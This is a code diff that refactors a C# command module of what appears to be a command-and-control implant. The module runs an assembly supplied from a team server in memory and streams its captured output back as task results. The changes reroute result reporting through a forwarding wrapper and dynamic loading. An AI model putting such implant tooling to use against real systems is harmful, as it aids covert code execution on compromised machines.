@@ -1,16 +1,11 @@
-﻿using Engineer.Extra;
-using Engineer.Functions;
-using Engineer.Models;
-using System;
-using System.Collections.Generic;
+﻿using System;
 using System.IO;
-using System.Linq;
 using System.Reflection;
-using System.Runtime.InteropServices;
-using System.Security;
 using System.Text;
 using System.Threading;
 using System.Threading.Tasks;
+using DynamicEngLoading;
+
 
 namespace Engineer.Commands
 {
@@ -24,12 +19,12 @@ namespace Engineer.Commands
 
             if (task.File == null)
             {
-                Tasking.FillTaskResults("error: " + "no assembly suppiled use the /file argument, file location should be on team server.", task, EngTaskStatus.FailedWithWarnings, TaskResponseType.String);
+                ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults("error: " + "no assembly suppiled use the /file argument, file location should be on team server.", task, EngTaskStatus.FailedWithWarnings, TaskResponseType.String);
                 return;
             }
             if (task.File.Length < 1)
             {
-                Tasking.FillTaskResults("error: " + "no assembly suppiled use the /file argument, file location should be on team server.", task, EngTaskStatus.FailedWithWarnings, TaskResponseType.String);
+                ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults("error: " + "no assembly suppiled use the /file argument, file location should be on team server.", task, EngTaskStatus.FailedWithWarnings, TaskResponseType.String);
                 return;
             }
             task.Arguments.TryGetValue("/args", out string assemblyArgument);
@@ -100,19 +95,19 @@ namespace Engineer.Commands
 
                     //start the thread 
                     thread.Start();
-                    //while the thread is running call Tasking.FillTaskResults to update the task results
+                    //while the thread is running call ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults to update the task results
                     while (thread.IsAlive)
                     {
                         output = Encoding.UTF8.GetString(ms.ToArray());
                         if (output.Length > 0)
                         {
                             ms.Clear();
-                            Tasking.FillTaskResults(output, task, EngTaskStatus.Running, TaskResponseType.String);
+                            ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults(output, task, EngTaskStatus.Running, TaskResponseType.String);
                             output = ""; 
                         }
                         if (task.cancelToken.IsCancellationRequested)
                         {
-                            Tasking.FillTaskResults("[-]Task Cancelled", task, EngTaskStatus.Cancelled, TaskResponseType.String);
+                            ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults("[-]Task Cancelled", task, EngTaskStatus.Cancelled, TaskResponseType.String);
                             thread.Abort();
                             break;
                         }
@@ -125,7 +120,7 @@ namespace Engineer.Commands
                 }
                 Console.SetOut(currentout);
                 Console.SetError(currenterror);
-                Tasking.FillTaskResults(output, task, EngTaskStatus.Complete, TaskResponseType.String);
+                ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults(output, task, EngTaskStatus.Complete, TaskResponseType.String);
             }
             catch (Exception e)
             {
@@ -133,7 +128,7 @@ namespace Engineer.Commands
                 //Console.WriteLine(e.StackTrace);
                 Console.SetOut(currentout);
                 Console.SetError(currenterror);
-                Tasking.FillTaskResults($"{output} \n error: " + e.Message, task, EngTaskStatus.Failed, TaskResponseType.String);
+                ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults($"{output} \n error: " + e.Message, task, EngTaskStatus.Failed, TaskResponseType.String);
             }
         }
     }
@@ -163,7 +158,7 @@ namespace Engineer.Commands
             //start the thread 
             thread.Start();
             string output = "";
-            //while the thread is running call Tasking.FillTaskResults to update the task results
+            //while the thread is running call ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults to update the task results
             while (thread.IsAlive)
             {
                 Console.Out.Flush();
@@ -171,12 +166,12 @@ namespace Engineer.Commands
                 output = Encoding.UTF8.GetString(ms.ToArray());
                 if (output.Length > 0)
                 {
-                    Tasking.FillTaskResults(output, task, EngTaskStatus.Running, TaskResponseType.String);
+                    ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults(output, task, EngTaskStatus.Running, TaskResponseType.String);
                     output = "";
                 }
                 if (task.cancelToken.IsCancellationRequested)
                 {
-                    Tasking.FillTaskResults("[-]Task Cancelled", task, EngTaskStatus.Cancelled, TaskResponseType.String);
+                    ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults("[-]Task Cancelled", task, EngTaskStatus.Cancelled, TaskResponseType.String);
                     thread.Abort();
                     break;
                 }
